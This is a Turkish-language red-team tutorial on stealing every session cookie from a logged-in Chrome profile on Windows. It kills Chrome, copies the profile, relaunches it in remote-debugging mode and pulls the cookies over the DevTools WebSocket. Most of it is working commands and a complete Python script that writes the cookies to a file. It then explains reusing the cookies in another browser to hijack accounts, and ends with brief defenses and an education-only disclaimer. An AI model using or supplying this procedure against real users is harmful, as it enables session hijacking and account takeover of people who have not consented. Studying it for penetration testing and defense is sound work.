# Chrome Debug Mod | Cookie Stealing (Windows)

## Amaç

Kurbanın aktif olarak oturum açtığı bir Chrome profilini, `--remote-debugging-port` özelliğiyle kontrol altına alarak **tarayıcı içerisindeki tüm çerezleri programatik olarak ele geçirmek**.

Bu teknik, local erişimi olan bir saldırgan tarafından veya kötü amaçlı bir script ile **şifrelenmemiş profiller üzerinde** uygulanabilir.

---

## Teorik Arkaplan

Google Chrome, geliştiricilerin tarayıcı ile etkileşim kurabilmesi için `--remote-debugging-port=<port>` parametresi ile başlatıldığında DevTools üzerinden WebSocket arayüzü sunar. Bu port üzerinden:
- Sekmeler kontrol edilebilir
- HTTP istekleri izlenebilir
- Çerezler (`Network.getAllCookies`) dahil birçok hassas veriye erişilebilir

---

## Ön Koşullar

- Kurbanın Chrome profiline **fiziksel veya sistem düzeyinde erişim**
- Chrome şifresiz başlatılmalı (profil şifrelenmemeli)
- Profilin aktif olduğu Google hesabında oturum açık olmalı

---

## Adımlar

### 1. Chrome Profilini Kopyala

```cmd
taskkill /F /IM chrome.exe

robocopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default" "%USERPROFILE%\Desktop\ChromeTemp\Default" /MIR /XJ
```

> Aktif kullanıcı profilini yeni bir dizine (örneğin: `ChromeTemp`) klonluyoruz.

---

### 2. Chrome’u Debug Modda Başlat

```cmd
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" ^
--user-data-dir="%USERPROFILE%\Desktop\ChromeTemp" ^
--profile-directory="Default" ^
--remote-debugging-port=9222 ^
--no-first-run ^
--no-default-browser-check
```

> Chrome arka planda açılır ve 9222 portu üzerinden dış bağlantılara hazır hale gelir.

---

### 3. DevTools JSON Endpoint’ine Eriş

Tarayıcı veya komut satırı üzerinden erişim:

```bash
curl http://localhost:9222/json
```

Dönen cevap örneği:

```json
[
  {
    "id": "C123",
    "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/C123",
    ...
  }
]
```

Bu WebSocket adresi kullanılarak tarayıcıya komut gönderilebilir.

---

### 4. Python ile Cookie’leri Çek

```python
import asyncio, websockets, json, requests

async def get_all_cookies():
    resp = requests.get("http://localhost:9222/json")
    targets = resp.json()
    ws_url = targets[0]["webSocketDebuggerUrl"]

    async with websockets.connect(ws_url) as ws:
        await ws.send(json.dumps({"id": 1, "method": "Network.enable"}))
        await ws.send(json.dumps({"id": 2, "method": "Network.getAllCookies"}))

        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            if data.get("id") == 2:
                with open("cookies.json", "w") as f:
                    json.dump(data["result"]["cookies"], f, indent=2)
                print("[+] Çerezler kaydedildi.")
                break

asyncio.run(get_all_cookies())
```

---

## Elde Edilen Veriler

`cookies.json` dosyasına, aşağıdaki formatta tüm sekme ve alanlardan toplanmış oturum çerezleri gelecektir:

```json
[
  {
    "domain": ".github.com",
    "name": "user_session",
    "value": "gho_example_token",
    "httpOnly": true,
    "secure": true
  }
]
```

Bu çerezler, tarayıcı uzantıları (örneğin: Cookie Editor) kullanılarak başka bir tarayıcıda içe aktarılıp **kullanıcının oturumu çalınabilir.**

---

## Güvenlik Önlemleri

Kendinizi bu tür saldırılara karşı korumak için:

- Chrome profilinizin şifreli kullanıcı hesabı altında olması (BitLocker, disk şifreleme)
- Chrome profiline fiziksel erişimi sınırlamak
- Tarayıcınızda güvenli oturum yönetimi ve 2FA kullanmak
- Arka planda çalışan Chrome süreçlerine dikkat etmek

---

## Gerçek Dünya Senaryosu

Bir Red Team testi sırasında, fiziksel erişimi olan bir danışman aşağıdaki zinciri kullandı:

- Hedefin tarayıcısı kapalıyken `Default` profili USB’ye klonlandı
- Klonlanmış profille offline ortamda Chrome debug modda başlatıldı
- Çerezler çekilerek kritik web sistemlerine yeniden oturum açma sağlandı (token reuse)

---

## Sonuç

Chrome’un debug portu özelliği, saldırganlar için güçlü bir araç olabilir. Özellikle fiziksel ya da sistem düzeyi erişim olduğunda, oturum çerezlerinin tamamına erişmek mümkündür. Bu teknik:

- Tarayıcı içi oturumların ele geçirilmesi  
- Red Team iç testleri  
- Geliştirici/sızma testçisi için local analiz için pratik ve hızlı bir yöntemdir.

---

## Uyarı

> Bu yazı yalnızca eğitim ve sızma testi (penetrasyon testi) amaçlıdır. İzinsiz sistemlere uygulanması **suç teşkil eder.**
